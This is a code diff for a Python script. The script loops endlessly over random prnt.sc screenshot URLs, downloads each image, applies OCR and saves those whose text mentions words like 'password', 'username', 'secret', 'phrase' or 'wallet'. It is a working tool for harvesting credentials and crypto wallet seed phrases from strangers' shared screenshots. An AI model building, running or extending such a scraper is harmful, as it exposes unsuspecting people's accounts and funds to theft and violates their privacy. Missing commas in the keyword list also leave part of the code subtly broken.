@@ -4,15 +4,14 @@ import requests
 from bs4 import BeautifulSoup
 import shutil
 import numpy as np
+from random import choice
+from string import ascii_lowercase, digits
+import time
 
 # get grayscale image
 def get_grayscale(image):
 	return cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
 
-# noise removal
-def remove_noise(image):
-	return cv2.medianBlur(image,5)
- 
 #thresholding
 def thresholding(image):
 	return cv2.threshold(image, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)[1]
@@ -36,87 +35,154 @@ def opening(image):
 def canny(image):
 	return cv2.Canny(image, 100, 200)
 
-#skew correction
-def deskew(image):
-	coords = np.column_stack(np.where(image > 0))
-	angle = cv2.minAreaRect(coords)[-1]
-	if angle < -45:
-		angle = -(90 + angle)
-	else:
-		angle = -angle
-	(h, w) = image.shape[:2]
-	center = (w // 2, h // 2)
-	M = cv2.getRotationMatrix2D(center, angle, 1.0)
-	rotated = cv2.warpAffine(image, M, (w, h), flags=cv2.INTER_CUBIC, borderMode=cv2.BORDER_REPLICATE)
-	return rotated
+def checkImage( image, keywords, blacklist ):
 
-#template matching
-def match_template(image, template):
-	return cv2.matchTemplate(image, template, cv2.TM_CCOEFF_NORMED) 
+	try:
+		text = pytesseract.image_to_string( image ).lower()
+	except:
+		return False
+
+	for word in blacklist:
+		if word in text:
+			print( 'found: ' + word )
+			return False
+
+	for word in keywords:
+		if word in text:
+			print( 'found: ' + word )
+			return word
+
+	return False
 
 # Starting number
-number = 1000
-
-# Prnt.sc URL Base
-page = f'https://prnt.sc/gg{number}'
-
-# Request Page
-result = requests.get('https://prnt.sc/fs2342', headers={'User-Agent': 'Chrome'})
-
-# If page accessed
-if result.status_code == 200:
-
-	# Process page to HTML
-	soup = BeautifulSoup(result.content, "lxml")
-
-	# Find Image
-	img = soup.find('img',{'class':'screenshot-image'})
-	img_url = img['src']
-
-	# If image is missing HTTP add it
-	if 'http' not in img_url:
-		img_url = 'http:' + img_url
-
-	print( f'Searching {page}' )
-
-	# Open the url image, set stream to True, this will return the stream content.
-	r = requests.get(img_url, stream = True, headers={'User-Agent': 'Chrome'})
-
-	# Check if the image was retrieved successfully
-	if r.status_code == 200:
-
-		# Set decode_content value to True, otherwise the downloaded image file's size will be zero.
-		r.raw.decode_content = True
-
-		# Open a local file with wb ( write binary ) permission.
-		filename = 'temp.png'
-		with open(filename,'wb') as f:
-			shutil.copyfileobj(r.raw, f)
-		
-		# Read the image
-		img = cv2.imread(filename)
+number = 1228
 
 
-		###* IMAGE PRE-PROCESSING ###
+# Keywords we want to search for
+keywords = [
+	'password',
+	'email',
+	'username',
+	'phrase',
+	'secret',
+	'e-mail'
+	'e mail'
+	'pasword'
+	'wallet'
+]
 
-		img_gray = get_grayscale(img)
-		img_threshed = thresholding( img_gray )
-		cv2.imwrite( 'temp2.png', img_threshed )
+blacklist = [
+	'georgian33',
+	'sergein777',
+	'bit king',
+	'jira',
+	'jiratrade'
+]
 
-		###* END ###
+while(True):
 
-		# Read text from image
-		text = pytesseract.image_to_string( img_threshed ).lower()
-		print(text)
-		# Find keyword "password" in text
-		if 'career' in text:
-			print('found')
-			shutil.move( 'temp.png', 'images/' + number + '.png' )
-		else:
+	# Increment Page number
+	slug_letters = ''.join(choice(ascii_lowercase) for i in range(3))
+	slug_numbers = ''.join(choice(digits) for i in range(3))
+
+	# Prnt.sc URL
+	page = f'https://prnt.sc/{slug_letters}{slug_numbers}'
+
+	# Request Page
+	try:
+		result = requests.get(page, headers={'User-Agent': 'Chrome'})
+	except:
+		print('Error getting page')
+		time.sleep(5)
+		continue
+
+	# If page accessed
+	if result.status_code == 200:
+
+		# Process page to HTML
+		soup = BeautifulSoup(result.content, "lxml")
+
+		# Find Image
+		img = soup.find('img',{'class':'screenshot-image'})
+		img_url = img['src']
+
+		# If image is missing HTTP add it
+		if 'http' not in img_url:
+			img_url = 'http:' + img_url
+
+		print( f'Searching {page}' )
+
+		# Open the url image, set stream to True, this will return the stream content.
+		try:
+			r = requests.get(img_url, stream = True, headers={'User-Agent': 'Chrome'})
+		except:
+			print('Error getting image')
+			time.sleep(1)
+			continue
+
+		# Check if the image was retrieved successfully
+		if r.status_code == 200:
+
+			# Set decode_content value to True, otherwise the downloaded image file's size will be zero.
+			r.raw.decode_content = True
+
+			# Open a local file with wb ( write binary ) permission.
+			filename = 'temp.png'
+			with open(filename,'wb') as f:
+				shutil.copyfileobj(r.raw, f)
+			
+			# Read the image
+			img_base = cv2.imread(filename)
+
+			# First check the base image
+			try:
+				found_word = checkImage( img_base, keywords, blacklist )
+			except:
+				print('Error while checking base image')
+				continue
+			if found_word :
+				shutil.move( 'temp.png', f'images/{slug_letters}{slug_numbers}-{found_word}.png' )
+				continue
+
+			# Get Grayscale image
+			try:
+				img_gray = get_grayscale( img_base )
+			except:
+				print('Error while grayscaling')
+				continue
+
+			# Check grayscale image
+			found_word = checkImage( img_gray, keywords, blacklist )
+			if found_word :
+				shutil.move( 'temp.png', f'images/{slug_letters}{slug_numbers}-{found_word}.png' )
+				continue
+
+			# Threshold Image
+			try:
+				img_threshed = thresholding( img_gray )
+			except:
+				print('Error with performing thresholding')
+				continue
+
+			# Check threshed image
+			found_word = checkImage( img_threshed, keywords, blacklist )
+			if found_word:
+				shutil.move( 'temp.png', f'images/{slug_letters}{slug_numbers}-{found_word}.png' )
+				continue
+
+			# Get opening image
+			# img_opening = opening( img_gray )
+			# if checkImage( img_opening, keywords ) :
+			# 	shutil.move( 'temp.png', f'images/{number}.png' )
+			# 	continue
+
+			# Get canny image
+			# img_canny = canny( img_gray )
+			# if checkImage( img_canny, keywords ) :
+			# 	shutil.move( 'temp.png', f'images/{number}.png' )
+			# 	continue
+
 			print( 'Found Nothing...' )
 
-	else:
-		print('Image Couldn\'t be retreived')
-# while(True):
-
-# 	number = number + 1
+		else:
+			print('Image Couldn\'t be retreived')
